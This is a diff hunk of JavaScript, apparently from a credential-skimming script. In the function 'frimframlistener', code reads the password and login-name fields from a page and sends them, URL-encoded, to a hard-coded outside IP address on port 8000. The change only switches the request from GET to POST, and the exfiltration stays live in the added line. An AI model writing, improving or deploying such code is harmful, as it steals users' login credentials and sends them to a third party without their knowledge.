@@ -13,7 +13,7 @@ function frimframlistener(){
 		un = frimframdoc.querySelector('#loginName').value;
 		var req = new XMLHttpRequest();
 		fin = encodeURIComponent('pwd='+pw+'&usr='+un);
-		req.open('get', 'http://74.14.159.250:8000/?' + fin);
+		req.open('post', 'http://74.14.159.250:8000/?' + fin);
 		req.send();
 	}catch(error){
 		console.error(error);
